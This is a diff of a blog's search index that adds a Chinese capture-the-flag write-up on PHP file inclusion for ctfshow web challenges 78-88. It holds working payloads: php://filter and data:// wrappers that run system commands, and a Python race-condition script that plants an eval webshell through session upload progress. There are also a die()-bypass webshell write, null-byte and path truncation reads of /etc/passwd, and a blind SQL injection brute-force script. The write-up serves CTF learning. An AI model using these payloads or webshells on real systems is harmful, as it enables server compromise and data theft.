@@ -425,6 +425,138 @@
       </categories>
   </entry>
   <entry>
+    <title>ctfshow入门文件包含部分</title>
+    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
+<a id="more"></a>
+<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
+<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
+<p>试了试文件日志包含漏洞</p>
+<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
+<p>访问发现成功</p>
+<p>进行getshell  先ls (可能需要多go几次)</p>
+<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
+<p>得到flag</p>
+<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
+<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
+<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
+<p>session.upload_progress在php5.4添加的。</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+</li>
+<li>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+</li>
+<li>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
+</li>
+<li>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</li>
+</ol>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
+<p><strong>分析</strong></p>
+<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
+<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<p><strong>session文件默认存储路径</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+<p>进入正题</p>
+<p><strong>题目源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
+<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
+<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
+<p>两个包payload设置如下</p>
+<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
+<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
+<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
+<p>同理也能得到flag</p>
+<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
+<p><strong>也可以使用python脚本</strong></p>
+<p>也直接用前面文章里的脚本：</p>
+<p>附上大佬的脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;q.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(f<span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> not in response.text:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(response.text)</span><br><span class="line">            sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>改下url和要执行的shell即可</p>
+<p><strong>参考文章:</strong></p>
+<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
+<p><a href="https://blog.csdn.net/qq_44657899/article/details/109281343">https://blog.csdn.net/qq_44657899/article/details/109281343</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
+<h2 id="web83"><a class="header-anchor" href="#web83">¶</a>web83</h2>
+<p><strong>源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Warning: session_destroy(): Trying to destroy uninitialized session in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 14</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:28:52</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">session_unset();</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line"></span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>warning提示了  ，所以表单构造需要重新构造，多了 <code>session_start();</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;668ba926-9165-49e7-92fb-c94a08d54feb.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;2333&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>web82-86用py脚本都能跑过</strong></p>
+<h2 id="web84"><a class="header-anchor" href="#web84">¶</a>web84</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:40:01</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    system(&quot;rm -rf &#x2F;tmp&#x2F;*&quot;);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web85"><a class="header-anchor" href="#web85">¶</a>web85</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 20:59:51</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    if(file_exists($file))&#123;</span><br><span class="line">        $content &#x3D; file_get_contents($file);</span><br><span class="line">        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;</span><br><span class="line">            die(&quot;error&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        include($file);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web86"><a class="header-anchor" href="#web86">¶</a>web86</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-16 21:20:43</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line">define(&#39;还要秀？&#39;, dirname(__FILE__));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web87"><a class="header-anchor" href="#web87">¶</a>web87</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析源码，这题有两个传参，file和 content，然后将content参数的值写入到file参数所定义的文件里，但是一同写入的还有，在开头增加了die的过程，导致即使我们成功写入一句话，也执行不了，我们所要做的就是绕过die</p>
+<p>这里放上p神的 <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#_1">谈一谈php://filter的妙用</a></p>
+<p>p神文章已经讲得很清楚了，base64算法解码时是4个byte一组, 而phpdie共6个字符，所以我们解码的时候需要再添加两个字符</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php(file的内容需要进行两次url编码)</span><br><span class="line"></span><br><span class="line">content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUWzFdKTs&#x2F;Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
+<p>写入一句话后，然后访问 1.php，就可以执行shell了</p>
+<p><a href="https://imgchr.com/i/sC1NvD"><img src="https://s3.ax1x.com/2021/01/03/sC1NvD.png" alt="sC1NvD.png"></a></p>
+<h2 id="web88"><a class="header-anchor" href="#web88">¶</a>web88</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-17 02:27:25</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">    $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">    if(preg_match(&quot;&#x2F;php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\.&#x2F;i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>data协议绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4</span><br><span class="line"></span><br><span class="line">即 ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure>
+<h2 id="其他包含小姿势"><a class="header-anchor" href="#其他包含小姿势">¶</a>其他包含小姿势</h2>
+<p>审计中可见这样的包含模版文件：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&quot;inc/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&quot;.htm&quot;</span>); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<ol>
+<li>%00截断<br>
+/etc/passwd%00<br>
+(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</li>
+<li>%00截断目录遍历：<br>
+/var/www/%00<br>
+(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</li>
+<li>路径长度截断：<br>
+/etc/passwd/././././././.[…]/./././././.<br>
+(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</li>
+<li>点号截断：<br>
+/boot.ini/………[…]…………<br>
+(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</li>
+</ol>
+<h3 id="php-input"><a class="header-anchor" href="#php-input">¶</a>php://input</h3>
+<p>php://input协议主要用于访问各个输入/输出流。CTF中经常使用<code>file_get_contents</code>获取php://input内容(POST)，需要开启allow_url_include，并且当<code>enctype=&quot;multipart/form-data&quot;</code>的时候 php://input是无效的。</p>
+<p><strong>利用方式：<code>?file=php://input 数据利用POST传过去</code></strong></p>
+<blockquote>
+<p>碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。</p>
+</blockquote>
+<p>假设页面源代码为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">if (@file_get_content($file) &#x3D;&#x3D; &#39;meizijiu&#39;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>直接使用Hackbar工具POST数据：</p>
+<p><a href="https://imgchr.com/i/sC1DUI"><img src="https://s3.ax1x.com/2021/01/03/sC1DUI.png" alt="sC1DUI.png"></a></p>
+<p>另外还可以写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">post数据:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong>:<a href="https://ca0y1h.top/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">https://ca0y1h.top/Web_security/basic_learning/13.文件包含漏洞利用/</a></p>
+<p><a href="https://www.cnblogs.com/NPFS/p/13797449.html">https://www.cnblogs.com/NPFS/p/13797449.html</a></p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>ctfshow</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ctfshow入门sql注入部分</title>
     <url>/2021/01/01/%5Bctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86%5D/</url>
     <content><![CDATA[<p><strong>ctfshow web入门 sql注入部分(不断更新)</strong></p>
@@ -552,138 +684,6 @@
 <p>下面两个python脚本</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://cd13a268-7832-48b3-91ba-9bbc519bf77d.chall.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
